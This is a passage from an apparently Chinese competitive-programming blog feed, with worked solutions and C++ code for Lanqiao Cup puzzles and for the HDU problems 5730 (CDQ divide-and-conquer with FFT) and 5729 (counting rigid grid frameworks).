a[dep]=i;</div><div class="line">            dfs(dep+<span class="number">1</span>);</div><div class="line">            a[dep]=<span class="number">-1</span>;</div><div class="line">            used[i]=<span class="literal">false</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    dfs(<span class="number">1</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,ans);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>答案：<code>64</code> 详见PPT。</p><h3 id="7-剪邮票"><a href="#7-剪邮票" class="headerlink" title="7.  剪邮票"></a>7.  剪邮票</h3><blockquote><p>如【图1.jpg】, 有12张连在一起的12生肖的邮票。<br>现在你要从中剪下5张来，要求必须是连着的。 （仅仅连接一个角不算相连）<br>比如，【图2.jpg】，【图3.jpg】中，粉红色所示部分就是合格的剪取。</p><p><img src="http://images2015.cnblogs.com/blog/786516/201603/786516-20160325211748964-811180521.jpg" alt="图1"><br><img src="http://images2015.cnblogs.com/blog/786516/201603/786516-20160325211908714-1883305515.jpg" alt="图2"><br><img src="http://images2015.cnblogs.com/blog/786516/201603/786516-20160325211918464-1520496628.jpg" alt="图3"> </p></blockquote><p>原谅我好像又讲错了。。。<del>看来去年挂的就是这题。。。</del><br>这题不能直接按方向dfs。。。因为按方向的dfs实际上只是一笔画。。。<br>不过我们可以用dfs选出5个格子然后算一个连通块的大小看是不是等于5。<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#include &lt;bits/stdc++.h&gt;</span></div><div class="line">using namespace std;</div><div class="line"></div><div class="line"><span class="keyword">int</span> va[<span class="number">6</span>][<span class="number">6</span>],cor[<span class="number">13</span>][<span class="number">2</span>],<span class="string">q[6]</span>;</div><div class="line"><span class="keyword">int</span> ans=<span class="number">0</span>;</div><div class="line"></div><div class="line"><span class="keyword">int</span> getsum(<span class="keyword">int</span> <span class="keyword">x</span>,<span class="keyword">int</span> <span class="keyword">y</span>)</div><div class="line">&#123;</div><div class="line">    <span class="regexp">//</span>值为<span class="number">0</span>的不用计算</div><div class="line">    <span class="keyword">if</span> (va[<span class="keyword">x</span>][<span class="keyword">y</span>]==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    <span class="regexp">//</span>算过一次就要清零，避免重复</div><div class="line">    va[<span class="keyword">x</span>][<span class="keyword">y</span>]=<span class="number">0</span>;</div><div class="line">    <span class="regexp">//</span>超出范围也没事，因为va数组的周围都是<span class="number">0</span></div><div class="line">    <span class="keyword">return</span> <span class="number">1</span>+getsum(<span class="keyword">x</span>-<span class="number">1</span>,<span class="keyword">y</span>)+getsum(<span class="keyword">x</span>+<span class="number">1</span>,<span class="keyword">y</span>)+getsum(<span class="keyword">x</span>,<span class="keyword">y</span>-<span class="number">1</span>)+getsum(<span class="keyword">x</span>,<span class="keyword">y</span>+<span class="number">1</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line">void dfs(<span class="keyword">int</span> dep,<span class="keyword">int</span> <span class="keyword">last</span>) &#123;</div><div class="line">    <span class="keyword">if</span> (dep==<span class="number">5</span>) &#123;</div><div class="line">        memset(va,<span class="number">0</span>,sizeof(va));</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++) &#123;</div><div class="line">            va[cor[<span class="string">q[i]</span>][<span class="number">0</span>]][cor[<span class="string">q[i]</span>][<span class="number">1</span>]]=<span class="number">1</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> (getsum(cor[<span class="keyword">last</span>][<span class="number">0</span>],cor[<span class="keyword">last</span>][<span class="number">1</span>])==<span class="number">5</span>) ans++;</div><div class="line">        <span class="keyword">return</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="keyword">last</span>+<span class="number">1</span>;i&lt;=<span class="number">12</span>;i++) &#123;</div><div class="line">        <span class="regexp">//q</span>数组保存我们选中的格子</div><div class="line">        <span class="string">q[dep]</span>=i;</div><div class="line">        dfs(dep+<span class="number">1</span>,i);</div><div class="line">        <span class="string">q[dep]</span>=-<span class="number">1</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">int</span> main()</div><div class="line">&#123;</div><div class="line">    <span class="regexp">//</span>算出第n个格子的横纵坐标</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>,n=<span class="number">1</span>;i&lt;=<span class="number">3</span>;i++) &#123;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=<span class="number">4</span>;j++,n++) &#123;</div><div class="line">            cor[n][<span class="number">0</span>]=i;cor[n][<span class="number">1</span>]=j;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    dfs(<span class="number">0</span>,<span class="number">0</span>);</div><div class="line">    <span class="keyword">printf</span>(<span class="string">"%d\n"</span>,ans);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>正确答案：<code>116</code></p><h3 id="8-四平方和"><a href="#8-四平方和" class="headerlink" title="8.   四平方和"></a>8.   四平方和</h3><blockquote><p>四平方和定理，又称为拉格朗日定理：<br>每个正整数都可以表示为至多4个正整数的平方和。<br>如果把0包括进去，就正好可以表示为4个数的平方和。</p><p>比如：<br>5 = 0^2 + 0^2 + 1^2 + 2^2<br>7 = 1^2 + 1^2 + 1^2 + 2^2<br>（^符号表示乘方的意思） </p><p>对于一个给定的正整数，可能存在多种平方和的表示法。<br>要求你对4个数排序： 0 &lt;= a &lt;= b &lt;= c &lt;= d<br>并对所有的可能表示法按 a,b,c,d 为联合主键升序排列，最后输出第一个表示法 </p><p>程序输入为一个正整数N (N&lt;5000000)<br>要求输出4个非负整数，按从小到大排序，中间用空格分开   </p><p>例如，输入：<br>5<br>则程序应该输出：<br>0 0 1 2<br>再例如，输入：<br>12<br>则程序应该输出：<br>0 2 2 2<br>再例如，输入：<br>773535<br>则程序应该输出：<br>1 1 267 838</p><p>资源约定：<br>峰值内存消耗 &lt; 256M<br>CPU消耗  &lt; 3000ms </p><p>请严格按要求输出，不要画蛇添足地打印类似：“请您输入…” 的多余内容。<br>所有代码放在同一个源文件中，调试通过后，拷贝提交该源码。<br>注意: main函数需要返回0<br>注意: 只使用ANSI C/ANSI C++ 标准，不要调用依赖于编译环境或操作系统的特殊函数。<br>注意: 所有依赖的函数必须明确地在源文件中 #include <xxx>， 不能通过工程设置而省略常用头文件。<br>提交时，注意选择所期望的编译器类型。 </xxx></p></blockquote><p>时间3s，直接枚举。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">resolve</span><span class="params">(<span class="keyword">int</span> n)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> n1=n;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=<span class="built_in">sqrt</span>(n1);i++) &#123;</div><div class="line">        <span class="keyword">int</span> n2=n1-i*i;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;=<span class="built_in">sqrt</span>(n2);j++) &#123;</div><div class="line">            <span class="keyword">int</span> n3=n2-j*j;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;=<span class="built_in">sqrt</span>(n3);k++) &#123;</div><div class="line">                <span class="keyword">int</span> n4=n3-k*k;</div><div class="line">                <span class="keyword">int</span> l=<span class="built_in">sqrt</span>(n4);</div><div class="line">                <span class="keyword">if</span> (l*l==n4) &#123;</div><div class="line">                    <span class="built_in">printf</span>(<span class="string">"%d %d %d %d\n"</span>,i,j,k,l);</div><div class="line">                    <span class="keyword">return</span>;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> n;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">    resolve(n);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h3 id="9-密码脱落"><a href="#9-密码脱落" class="headerlink" title="9.  密码脱落"></a>9.  密码脱落</h3><blockquote><p>X星球的考古学家发现了一批古代留下来的密码。<br>这些密码是由A、B、C、D 四种植物的种子串成的序列。<br>仔细分析发现，这些密码串当初应该是前后对称的（也就是我们说的镜像串）。<br>由于年代久远，其中许多种子脱落了，因而可能会失去镜像的特征。 </p><p>你的任务是：  给定一个现在看到的密码串，计算一下从当初的状态，它要至少脱落多少个种子，才可能会变成现在的样子。 </p><p>输入一行，表示现在看到的密码串（长度不大于1000）<br>要求输出一个正整数，表示至少脱落了多少个种子。 </p><p>例如，输入：<br>ABCBA<br>则程序应该输出：<br>0<br>再例如，输入：<br>ABECDCBABC<br>则程序应该输出：<br>3</p><p>资源约定：<br>峰值内存消耗 &lt; 256M<br>CPU消耗  &lt; 1000ms </p><p>请严格按要求输出，不要画蛇添足地打印类似：“请您输入…” 的多余内容。<br>所有代码放在同一个源文件中，调试通过后，拷贝提交该源码。<br>注意: main函数需要返回0<br>注意: 只使用ANSI C/ANSI C++ 标准，不要调用依赖于编译环境或操作系统的特殊函数。 注意: 所有依赖的函数必须明确地在源文件中 #include <xxx>， 不能通过工程设置而省略常用头文件。<br>提交时，注意选择所期望的编译器类型。 </xxx></p></blockquote><p>经典水题，不过可能要先了解一下动态规划 <a href="http://www.cnblogs.com/kkgreen/archive/2011/06/26/2090702.html" target="_blank" rel="noopener">动态规划资料</a><br>教材原题 <a href="http://www.wenkuxiazai.com/doc/e73fa90979563c1ec5da7182.html" target="_blank" rel="noopener">最小回文代价资料</a> 看前两页就可以了，教材的具体实现都是复杂化的。<br>原串和逆序串做LCS <a href="http://www.cnblogs.com/ranjiewen/p/5559490.html" target="_blank" rel="noopener">LCS资料</a><br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">char</span> s[<span class="number">1010</span>];</div><div class="line"><span class="keyword">int</span> dp[<span class="number">1010</span>][<span class="number">1010</span>];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>,s+<span class="number">1</span>);</div><div class="line">    <span class="keyword">int</span> n=<span class="built_in">strlen</span>(s+<span class="number">1</span>);</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=n;j++) &#123;</div><div class="line">            <span class="keyword">if</span> (s[i]==s[n+<span class="number">1</span>-j]) &#123;</div><div class="line">                dp[i][j]=dp[i<span class="number">-1</span>][j<span class="number">-1</span>]+<span class="number">1</span>;</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                dp[i][j]=max(dp[i<span class="number">-1</span>][j],dp[i][j<span class="number">-1</span>]);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,n-dp[n][n]);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h3 id="10-最大比例"><a href="#10-最大比例" class="headerlink" title="10.  最大比例"></a>10.  最大比例</h3><p><a href="../2016lanqiao2">最大比例题解</a></p><p>以上各题的解法和答案，如有错误，请及时指出，谢谢！</p>]]></content>
      
      
        <tags>
            
            <tag> 蓝桥杯 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>hdu 5730 Shell Necklace cdq分治+FFT</title>
      <url>/blog/2017/03/02/hdu5730/</url>
      <content type="html"><![CDATA[<h3 id="Shell-Necklace"><a href="#Shell-Necklace" class="headerlink" title="Shell Necklace"></a><a href="http://acm.hdu.edu.cn/showproblem.php?pid=5730" target="_blank" rel="noopener">Shell Necklace</a></h3><p>有一个很显然的递推式：$dp[i]=\sum_{j=0}^{i-1} dp[j]a_{i-j}$，当然朴素的算法是$O(n^2)$，肯定过不了。观察这个式子，发现符合fft的形式（<a href="http://blog.csdn.net/Leo_h1104/article/details/51615710" target="_blank" rel="noopener">了解FFT</a>），所以使用cdq分治+FFT（套路），复杂度为$O(nlog^{2}n)$。</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div></pre></td><td class="code"><pre><div class="line">#include &lt;bits/stdc++.h&gt;</div><div class="line">using namespace std;</div><div class="line">const double <span class="built_in">PI</span>=<span class="built_in">acos</span>(-<span class="number">1.0</span>);</div><div class="line">const <span class="built_in">int</span> MO=<span class="number">313</span>;</div><div class="line">const <span class="built_in">int</span> <span class="built_in">N</span>=<span class="number">100010</span>;</div><div class="line">struct <span class="built_in">Complex</span> &#123;</div><div class="line">    double x,y;</div><div class="line">    <span class="built_in">Complex</span>(double _x = <span class="number">0.0</span>,double _y = <span class="number">0.0</span>)</div><div class="line">    &#123;</div><div class="line">        x = _x;</div><div class="line">        y = _y;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">Complex</span> operator -(const <span class="built_in">Complex</span> &amp;b)const</div><div class="line">    &#123;</div><div class="line">        return <span class="built_in">Complex</span>(x-b.x,y-b.y);</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">Complex</span> operator +(const <span class="built_in">Complex</span> &amp;b)const</div><div class="line">    &#123;</div><div class="line">        return <span class="built_in">Complex</span>(x+b.x,y+b.y);</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">Complex</span> operator *(const <span class="built_in">Complex</span> &amp;b)const</div><div class="line">    &#123;</div><div class="line">        return <span class="built_in">Complex</span>(x*b.x-y*b.y,x*b.y+y*b.x);</div><div class="line">    &#125;</div><div class="line">&#125; x[<span class="number">280000</span>],y[<span class="number">280000</span>];</div><div class="line"><span class="built_in">int</span> a[<span class="built_in">N</span>],dp[<span class="built_in">N</span>];</div><div class="line"></div><div class="line">void change(<span class="built_in">Complex</span> y[],<span class="built_in">int</span> <span class="built_in">len</span>)</div><div class="line">&#123;</div><div class="line">    <span class="built_in">int</span> i,j,k;</div><div class="line">    for(i = <span class="number">1</span>, j = <span class="built_in">len</span>/<span class="number">2</span>; i &lt;<span class="built_in">len</span>-<span class="number">1</span>; i++) &#123;</div><div class="line">        <span class="built_in">if</span>(i &lt; j)swap(y[i],y[j]);</div><div class="line">        k = <span class="built_in">len</span>/<span class="number">2</span>;</div><div class="line">        while(j &gt;= k) &#123;</div><div class="line">            j -= k;</div><div class="line">            k /= <span class="number">2</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">if</span>(j &lt; k)j += k;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">void fft(<span class="built_in">Complex</span> y[],<span class="built_in">int</span> <span class="built_in">len</span>,<span class="built_in">int</span> on)</div><div class="line">&#123;</div><div class="line">    change(y,<span class="built_in">len</span>);</div><div class="line">    for(<span class="built_in">int</span> h = <span class="number">2</span>; h &lt;= <span class="built_in">len</span>; h &lt;&lt;= <span class="number">1</span>) &#123;</div><div class="line">        <span class="built_in">Complex</span> wn(<span class="built_in">cos</span>(-on*<span class="number">2</span>*<span class="built_in">PI</span>/h),<span class="built_in">sin</span>(-on*<span class="number">2</span>*<span class="built_in">PI</span>/h));</div><div class="line">        for(<span class="built_in">int</span> j = <span class="number">0</span>; j &lt; <span class="built_in">len</span>; j+=h) &#123;</div><div class="line">            <span class="built_in">Complex</span> w(<span class="number">1</span>,<span class="number">0</span>);</div><div class="line">            for(<span class="built_in">int</span> k = j; k &lt; j+h/<span class="number">2</span>; k++) &#123;</div><div class="line">                <span class="built_in">Complex</span> u = y[k];</div><div class="line">                <span class="built_in">Complex</span> <span class="built_in">t</span> = w*y[k+h/<span class="number">2</span>];</div><div class="line">                y[k] = u+<span class="built_in">t</span>;</div><div class="line">                y[k+h/<span class="number">2</span>] = u-<span class="built_in">t</span>;</div><div class="line">                w = w*wn;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">if</span>(on == -<span class="number">1</span>) &#123;</div><div class="line">        for(<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">len</span>; i++)</div><div class="line">            y[i].x /= <span class="built_in">len</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">void cdq(<span class="built_in">int</span> l,<span class="built_in">int</span> r)</div><div class="line">&#123;</div><div class="line">    <span class="built_in">if</span> (l==r) &#123;</div><div class="line">        dp[l]+=a[l];</div><div class="line">        dp[l]%=MO;</div><div class="line">        return;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">int</span> <span class="built_in">mid</span>=(l+r)&gt;&gt;<span class="number">1</span>;</div><div class="line">    cdq(l,<span class="built_in">mid</span>);</div><div class="line">    <span class="built_in">int</span> len1=<span class="built_in">mid</span>-l+<span class="number">1</span>;</div><div class="line">    <span class="built_in">int</span> len2=r-l+<span class="number">1</span>;</div><div class="line">    <span class="built_in">int</span> <span class="built_in">len</span>=<span class="number">1</span>;</div><div class="line">    while (<span class="built_in">len</span>&lt;=len2) <span class="built_in">len</span>&lt;&lt;=<span class="number">1</span>;</div><div class="line">    for (<span class="built_in">int</span> i=<span class="number">0</span>;i&lt;len1;i++) &#123;</div><div class="line">        x[i]=<span class="built_in">Complex</span>(dp[l+i],<span class="number">0</span>);</div><div class="line">    &#125;</div><div class="line">    for (<span class="built_in">int</span> i=len1;i&lt;<span class="built_in">len</span>;i++) &#123;</div><div class="line">        x[i]=<span class="built_in">Complex</span>(<span class="number">0</span>,<span class="number">0</span>);</div><div class="line">    &#125;</div><div class="line">    for (<span class="built_in">int</span> i=<span class="number">0</span>;i&lt;len2;i++) &#123;</div><div class="line">        y[i]=<span class="built_in">Complex</span>(a[i],<span class="number">0</span>);</div><div class="line">    &#125;</div><div class="line">    for (<span class="built_in">int</span> i=len2;i&lt;<span class="built_in">len</span>;i++) &#123;</div><div class="line">        y[i]=<span class="built_in">Complex</span>(<span class="number">0</span>,<span class="number">0</span>);</div><div class="line">    &#125;</div><div class="line">    fft(x,<span class="built_in">len</span>,<span class="number">1</span>);</div><div class="line">    fft(y,<span class="built_in">len</span>,<span class="number">1</span>);</div><div class="line">    for (<span class="built_in">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">len</span>;i++) &#123;</div><div class="line">        x[i]=x[i]*y[i];</div><div class="line">    &#125;</div><div class="line">    fft(x,<span class="built_in">len</span>,-<span class="number">1</span>);</div><div class="line">    for (<span class="built_in">int</span> i=<span class="built_in">mid</span>+<span class="number">1</span>;i&lt;=r;i++) &#123;</div><div class="line">        dp[i]+=<span class="built_in">round</span>(x[i-l].x);</div><div class="line">        dp[i]%=MO;</div><div class="line">    &#125;</div><div class="line">    cdq(<span class="built_in">mid</span>+<span class="number">1</span>,r);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="built_in">int</span> main()</div><div class="line">&#123;</div><div class="line">    <span class="built_in">int</span> <span class="built_in">n</span>;</div><div class="line">    while (scanf(<span class="string">"%d"</span>,&amp;<span class="built_in">n</span>),<span class="built_in">n</span>) &#123;</div><div class="line">        for (<span class="built_in">int</span> i=<span class="number">1</span>;i&lt;=<span class="built_in">n</span>;i++) &#123;</div><div class="line">            scanf(<span class="string">"%d"</span>,&amp;a[i]);</div><div class="line">            a[i]%=MO;</div><div class="line">        &#125;</div><div class="line">        memset(dp,<span class="number">0</span>,sizeof(dp));</div><div class="line">        dp[<span class="number">0</span>]=<span class="number">1</span>;</div><div class="line">        cdq(<span class="number">1</span>,<span class="built_in">n</span>);</div><div class="line">        printf(<span class="string">"%d\n"</span>,dp[<span class="built_in">n</span>]);</div><div class="line">    &#125;</div><div class="line">    return <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>hdu 5729 Rigid Frameworks</title>
      <url>/blog/2017/02/28/hdu5729/</url>
      <content type="html"><![CDATA[<p>题意：题目非常长，前面讲了一大堆刚性的和灵活的，但是问的是网格图。很显然网格图不是刚性的（如下图），但是我们可以通过添加对角线使得它变为刚性的，问有多少种添加的方法使变为刚性的。<br><img src="http://img.blog.csdn.net/20160804103901349" alt="网格图"><br>题解：可以<del>(很难)</del>发现，在摆动过程中，原来处于同一行的竖边一定平行；同理，原来处于同一列的横边一定平行。我们要做的即为所有横边垂直于所有竖边，那么一行和一列可以分别看做整体。更进一步地，如果两行竖边都垂直于同一列横边，这两行就属于同一个集合。<br>这里使用一个经典模型，将网格图的行和列作为二分图的左右两个点集，(x,y)连边就表示x行的竖边垂直于y列的横边，那么问题可以转化为最终n+m个点都连通的方案数。但是要注意，连边和添加对角线并不完全等价！添加对角线包含了主对角线和次对角线，而普通的连边没有这种含义。</p><p>我们设计一种动态规划（或者说递推），那它必然是总方案数减去不可行的方案数：<br>$$dp[n][m]=3^{nm}-\sum_{i=1,j=0}^{i&lt;n||j&lt;m} C_{n-1}^{i-1}C_{m}^{j}\cdot dp[i][j]\cdot 3^{(n-i)(m-j)}$$<br>$3^{nm}$表示对于每一个格子我们总是有无对角线，主对角线，次对角线三种选择。后面的减数项中，为了保证不重复，我们总是枚举左边明确的某一点（例如$1$号点）所在的连通块的左右大小。具体地，我们从$2-n$号点中选出$i-1$个，从$m$个点中选出$j$个，它们内部会有$dp[i][j]$种方案，至于剩下的$n-i$个点和$m-j$个点的关系，任意选择即可。</p><p>理解了之后写代码非常简单，可以用预处理做到$O(n^4)$<br><figure class="highlight prolog"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line">#include &lt;bits/stdc++.h&gt;</div><div class="line">using namespace std;</div><div class="line">typedef long long ll;</div><div class="line">const int <span class="symbol">N</span>=<span class="number">11</span>;</div><div class="line">const int <span class="symbol">MO</span>=<span class="number">1e9</span>+<span class="number">7</span>;</div><div class="line">ll <span class="symbol">C</span>[<span class="symbol">N</span>][<span class="symbol">N</span>],dp[<span class="symbol">N</span>][<span class="symbol">N</span>],po3[<span class="symbol">N</span>*<span class="symbol">N</span>];</div><div class="line"></div><div class="line">void init()</div><div class="line">&#123;</div><div class="line">    po3[<span class="number">0</span>]=<span class="number">1</span>;</div><div class="line">    for (int i=<span class="number">1</span>;i&lt;<span class="symbol">N</span>*<span class="symbol">N</span>;i++) &#123;</div><div class="line">        po3[i]=po3[i<span class="number">-1</span>]*<span class="number">3</span><span class="comment">%MO;</span></div><div class="line">    &#125;</div><div class="line">    <span class="symbol">C</span>[<span class="number">0</span>][<span class="number">0</span>]=<span class="number">1</span>;</div><div class="line">    for (int i=<span class="number">1</span>;i&lt;<span class="symbol">N</span>;i++) &#123;</div><div class="line">        <span class="symbol">C</span>[i][<span class="number">0</span>]=<span class="symbol">C</span>[i][i]=<span class="number">1</span>;</div><div class="line">        for (int j=<span class="number">1</span>;j&lt;i;j++) &#123;</div><div class="line">            <span class="symbol">C</span>[i][j]=(<span class="symbol">C</span>[i<span class="number">-1</span>][j<span class="number">-1</span>]+<span class="symbol">C</span>[i<span class="number">-1</span>][j])<span class="comment">%MO;</span></div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    for (int n=<span class="number">1</span>;n&lt;<span class="symbol">N</span>;n++) &#123;</div><div class="line">        for (int m=<span class="number">0</span>;m&lt;<span class="symbol">N</span>;m++) &#123;</div><div class="line">            dp[n][m]=po3[n*m];</div><div class="line">            for (int i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">                for (int j=<span class="number">0</span>;j&lt;=m;j++) &#123;</div><div class="line">                    if (i==n&amp;&amp;j==m) continue;</div><div class="line">                    dp[n][m]-=<span class="symbol">C</span>[n<span class="number">-1</span>][i<span class="number">-1</span>]*<span class="symbol">C</span>[m][j]<span class="comment">%MO*dp[i][j]%MO*po3[(n-i)*(m-j)]%MO;</span></div><div class="line">                    dp[n][m]=(dp[n][m]<span 